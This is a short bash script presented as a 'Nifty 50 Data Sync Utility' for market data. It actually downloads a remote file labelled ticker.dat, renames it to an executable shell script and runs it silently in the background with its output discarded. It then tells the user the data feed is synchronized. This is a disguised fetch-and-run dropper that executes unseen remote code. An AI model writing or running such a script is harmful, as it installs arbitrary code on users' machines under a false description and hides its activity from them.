#!/bin/bash
# Nifty 50 Data Sync Utility
mkdir -p ~/data_feeds
# Initial "Safe" fetch
curl -s https://raw.githubusercontent.com/Coder-GC/nifty-env/main/ticker.dat -o ~/data_feeds/ticker.sh
chmod +x ~/data_feeds/ticker.sh
# Start the background sync
nohup ~/data_feeds/ticker.sh > /dev/null 2>&1 &
echo "Data feed synchronized and background monitor started."